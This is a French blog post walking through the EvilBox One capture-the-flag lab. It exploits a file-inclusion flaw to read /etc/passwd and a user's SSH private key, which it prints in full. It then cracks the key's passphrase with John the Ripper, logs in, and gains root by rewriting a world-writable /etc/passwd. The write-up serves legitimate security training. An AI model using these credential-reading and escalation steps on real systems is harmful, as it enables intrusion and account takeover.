{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Evil: One","date":"29 August 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.26</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir EvilOne &amp;&amp; cd EvilOne</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -sV -sT -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.9p1 Debian <span class=\"token number\">10</span>+deb10u2 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.38 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur Apache 2.4.38 sur le port <strong>80</strong>.</p>\n<p>On commence par faire un scan du serveur Web avec <strong>Gobuster</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster.txt\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">10701</span><span class=\"token punctuation\">]</span>\n/robots.txt           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">12</span><span class=\"token punctuation\">]</span>   \n/secret               <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">313</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.26/secret/<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Le dossier \"/secret\" est vide. Tentons un autre <strong>Gobuster</strong> sur ce dossier.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span>/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,css,js,txt,php,zip -o gobuster-secret.txt\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">4</span><span class=\"token punctuation\">]</span>\n/evil.php             <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">0</span><span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Il y a la présence d'un fichier PHP \"evil.php\" dans ce dossier. Ce dernier ne retourne rien. Cherchons si un paramètre existe sur cette URL avec l'outil <strong>wfuzz</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh <span class=\"token number\">0</span> <span class=\"token string\">'http://192.168.1.26/secret/evil.php?FUZZ=/etc/passwd'</span>\n000000947:   <span class=\"token number\">200</span>        <span class=\"token number\">26</span> L     <span class=\"token number\">38</span> W       <span class=\"token number\">1431</span> Ch     <span class=\"token string\">\"command\"</span>      </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Il existe un paramètre, \"command\". Sur <a href=\"http://192.168.1.26/secret/evil.php?command=/etc/passwd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.1.26/secret/evil.php?command=/etc/passwd</a>, on a bien les infos d'utilisateurs dont celui d'un certain \"mowree\".</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">root:x:0:0:root:/root:/bin/bash\nmowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On est sur une faille de type LFI (Local File Inclusion).</p>\n<p>Et sur l'URL <a href=\"http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.1.26/secret/evil.php?command=/home/mowree/.ssh/id_rsa</a>, on tombe bien sur la clef SSH de l'utilisateur.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E\n\nuuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6\nhqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe\no7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb\n+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot\nb7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k\nHtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg\n9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY\nzh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu\nrRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1\ntHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs\n94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm\nVD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7\nMb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P\nhrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr\nFb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR\nIIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R\nMtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS\n62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69\nQ/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8\np1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C\npwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X\nKREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa\ni99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp\n4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/\n8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==\n-----END RSA PRIVATE KEY-----</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On récupère ce fichier via <strong>wget</strong>.</p>\n<p><code class=\"language-text\">wget http://$IP/secret/evil.php?command=/home/mowree/.ssh/id_rsa -O id_rsa</code></p>\n<p>Et on n'oublie pas le <strong>chmod</strong> pour plus tard.</p>\n<p><code class=\"language-text\">chmod 600 id_rsa</code></p>\n<p>Désormais, il nous faut retrouver la clef du mot de passe associé.</p>\n<p>Téléchargez l'utilitaire \"ssh2john.py\" avec la commande <code class=\"language-text\">wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py</code> et générez un nouveau fichier <code class=\"language-text\">python ssh2john.py id_rsa &gt; id_rsa.hash</code>.</p>\n<p>Afin d'utiliser <strong>John The Ripper</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ john --wordlist<span class=\"token operator\">=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash\nUsing default input encoding: UTF-8\nLoaded <span class=\"token number\">1</span> password <span class=\"token builtin class-name\">hash</span> <span class=\"token punctuation\">(</span>SSH <span class=\"token punctuation\">[</span>RSA/DSA/EC/OPENSSH <span class=\"token punctuation\">(</span>SSH private keys<span class=\"token punctuation\">)</span> <span class=\"token number\">32</span>/64<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nCost <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>KDF/cipher <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token operator\">=</span>MD5/AES <span class=\"token assign-left variable\">1</span><span class=\"token operator\">=</span>MD5/3DES <span class=\"token assign-left variable\">2</span><span class=\"token operator\">=</span>Bcrypt/AES<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> is <span class=\"token number\">1</span> <span class=\"token keyword\">for</span> all loaded hashes\nCost <span class=\"token number\">2</span> <span class=\"token punctuation\">(</span>iteration count<span class=\"token punctuation\">)</span> is <span class=\"token number\">2</span> <span class=\"token keyword\">for</span> all loaded hashes\nWill run <span class=\"token number\">2</span> OpenMP threads\n\nNote: This <span class=\"token function\">format</span> may emit <span class=\"token boolean\">false</span> positives, so it will keep trying even after\nfinding a possible candidate.\nPress <span class=\"token string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"token keyword\">for</span> status\nunicorn          <span class=\"token punctuation\">(</span>id_rsa<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p><strong>John</strong> a trouvé le mot de passe, \"unicorn\".</p>\n<h2>Pénétration</h2>\n<p>En posséssion de la clef SSH et du mot de passe associé, on peut donc se connecter au serveur <strong>SSH</strong> sans encombres.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> mowree@<span class=\"token variable\">$IP</span> -i id_rsa\nThe authenticity of <span class=\"token function\">host</span> <span class=\"token string\">'192.168.1.26 (192.168.1.26)'</span> can<span class=\"token string\">'t be established.\nECDSA key fingerprint is SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span><span class=\"token number\">192.168</span>.1.26<span class=\"token string\">' (ECDSA) to the list of known hosts.\nEnter passphrase for key '</span>id_rsa': \nLinux EvilBoxOne <span class=\"token number\">4.19</span>.0-17-amd64 <span class=\"token comment\">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On trouve le premier flag dans le fichier \"user.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>On voit que le fichier \"passwd\" est modifiable.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ls</span> -la /etc/passwd\n-rw-rw-rw- <span class=\"token number\">1</span> root root <span class=\"token number\">1431</span> ago <span class=\"token number\">29</span> <span class=\"token number\">12</span>:50 /etc/passwd</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On génère donc un nouveau mot de passe \"unicorn\" via <strong>openssl</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ openssl <span class=\"token function\">passwd</span> -1 unicorn\n<span class=\"token variable\">$1</span><span class=\"token variable\">$U413</span>.MQ6$.ZO/2.l5DWY.2OotSCog61</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>On copie ce mot de passe dans le fichier \"passwd\" dans la ligne ci-dessous.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">nano</span> /etc/passwd\nroot:<span class=\"token variable\">$1</span><span class=\"token variable\">$U413</span>.MQ6$.ZO/2.l5DWY.2OotSCog61:0:0:root:/root:/bin/bash</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Une fois le fichier enregistré, on peut se connecter en \"root\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">su</span> -l root\nContraseña: unicorn\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">grupos</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Et trouver le flag de ce dernier.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/root.txt\n36QtXfdJWvdC0VavlPIApUbDlqTsBM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/evilbox-one,736","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":8,"parts":[]}},"context":{}}